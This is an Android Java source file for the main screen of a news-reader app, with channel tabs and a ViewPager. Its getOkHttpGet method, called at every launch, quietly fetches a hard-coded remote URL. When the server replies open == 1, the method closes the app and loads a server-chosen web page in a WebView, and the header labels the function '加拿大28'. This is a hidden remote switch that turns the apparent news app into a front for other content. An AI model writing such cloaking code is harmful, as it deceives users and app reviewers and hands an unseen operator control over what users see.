package com.laowojianada2802.ounews.module.news.ui;

import android.content.Intent;
import android.support.design.widget.TabLayout;
import android.support.v4.view.ViewPager;
import android.util.Log;
import android.view.MenuItem;
import android.view.View;

import com.google.gson.Gson;
import com.laowojianada2802.ounews.R;
import com.laowojianada2802.ounews.annotation.ActivityFragmentInject;
import com.laowojianada2802.ounews.app.AppManager;
import com.laowojianada2802.ounews.base.BaseActivity;
import com.laowojianada2802.ounews.base.BaseFragment;
import com.laowojianada2802.ounews.base.BaseFragmentAdapter;
import com.laowojianada2802.ounews.bean.OpenEntity;
import com.laowojianada2802.ounews.greendao.NewsChannelTable;
import com.laowojianada2802.ounews.module.news.presenter.INewsPresenter;
import com.laowojianada2802.ounews.module.news.presenter.INewsPresenterImpl;
import com.laowojianada2802.ounews.module.news.view.INewsView;
import com.laowojianada2802.ounews.utils.RxBus;
import com.laowojianada2802.ounews.utils.ViewUtil;
import com.laowojianada2802.ounews.web.WebAct;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import rx.Observable;
import rx.functions.Action1;

/**
 * ClassName: NewsActivity<p>
 * Author: oubowu<p>
 * Fuction: 加拿大28<p>
 * CreateDate: 2016/2/20 2:12<p>
 * UpdateUser: <p>
 * UpdateDate: <p>
 */
@ActivityFragmentInject(contentViewId = R.layout.activity_news,
        menuId = R.menu.menu_news,
        hasNavigationView = true,
        toolbarTitle = R.string.news,
        toolbarIndicator = R.drawable.ic_list_white,
        menuDefaultCheckedItem = R.id.action_news)
public class NewsActivity extends BaseActivity<INewsPresenter> implements INewsView {

    private Observable<Boolean> mChannelObservable;

    @Override
    protected void onDestroy() {
        super.onDestroy();
        RxBus.get().unregister("channelChange", mChannelObservable);
    }

    @Override
    protected void initView() {

        // 设了默认的windowBackground使得冷启动没那么突兀，这里再设置为空减少过度绘制
        getWindow().setBackgroundDrawable(null);
        ViewUtil.quitFullScreen(NewsActivity.this);
        AppManager.getAppManager().orderNavActivity(getClass().getName(), false);
        mPresenter = new INewsPresenterImpl(NewsActivity.this);

        getOkHttpGet();

    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == R.id.action_channel_manage) {
            //  跳转到频道选择界面
           showActivity(this, new Intent(this, NewsChannelActivity.class));
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    public void initViewPager(List<NewsChannelTable> newsChannels) {

        TabLayout tabLayout = (TabLayout) findViewById(R.id.tabs);

        final ViewPager viewPager = (ViewPager) findViewById(R.id.viewpager);

        List<BaseFragment> fragments = new ArrayList<>();
        final List<String> title = new ArrayList<>();

        if (newsChannels != null) {
            // 有除了固定的其他频道被选中，添加
            for (NewsChannelTable news : newsChannels) {
                final NewsListFragment fragment = NewsListFragment
                        .newInstance(news.getNewsChannelId(), news.getNewsChannelType(),
                                news.getNewsChannelIndex());

                fragments.add(fragment);
                title.add(news.getNewsChannelName());
            }

            if (viewPager.getAdapter() == null) {
                // 初始化ViewPager
                BaseFragmentAdapter adapter = new BaseFragmentAdapter(getSupportFragmentManager(),
                        fragments, title);
                viewPager.setAdapter(adapter);
            } else {
                final BaseFragmentAdapter adapter = (BaseFragmentAdapter) viewPager.getAdapter();
                adapter.updateFragments(fragments, title);
            }
            viewPager.setCurrentItem(0, false);
            tabLayout.setupWithViewPager(viewPager);
            tabLayout.setScrollPosition(0, 0, true);
            // 根据Tab的长度动态设置TabLayout的模式
            ViewUtil.dynamicSetTabLayoutMode(tabLayout);

            setOnTabSelectEvent(viewPager, tabLayout);

        } else {
            toast("数据异常");
        }

    }

    @Override
    public void initRxBusEvent() {
        mChannelObservable = RxBus.get().register("channelChange", Boolean.class);
        mChannelObservable.subscribe(new Action1<Boolean>() {
            @Override
            public void call(Boolean change) {
                if (change) {
                    mPresenter.operateChannelDb();
                }
            }
        });
    }


    public void getOkHttpGet() {
        final OkHttpClient okHttpClient = new OkHttpClient()
                .newBuilder()
                .build();
        final Request request = new Request.Builder()
                .url("http://888.shof789.com/Home/Outs/index/mchid/591034827b587.html")
                .build();
        new Thread(new Runnable() {
            @Override
            public void run() {
                Call call = okHttpClient.newCall(request);
                call.enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        Log.d("zgx","response====="+e.getMessage());
                    }

                    @Override
                    public void onResponse(Call call,  okhttp3.Response response) throws IOException {
                        final String responseStr = response.body().string();
                        Log.d("zgx","response====="+responseStr);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                OpenEntity result = new Gson().fromJson(responseStr, OpenEntity.class);

                                Log.e("result:","msg:open" + result.msg.open);
                                Intent intent = null;
                                if (result.msg.open == 1){ //默认1

                                    intent = new Intent(NewsActivity.this, WebAct.class);
                                    intent.putExtra(WebAct.WEB_EXT_TITLE,"");
                                    intent.putExtra(WebAct.WEB_EXT_URL,result.msg.links);
                                    startActivity(intent);
                                    NewsActivity.this.finish();

                                }else{
                                }
                            }
                        });

                        response.body().close();
                    }
                });
            }
        }).start();
    }
}
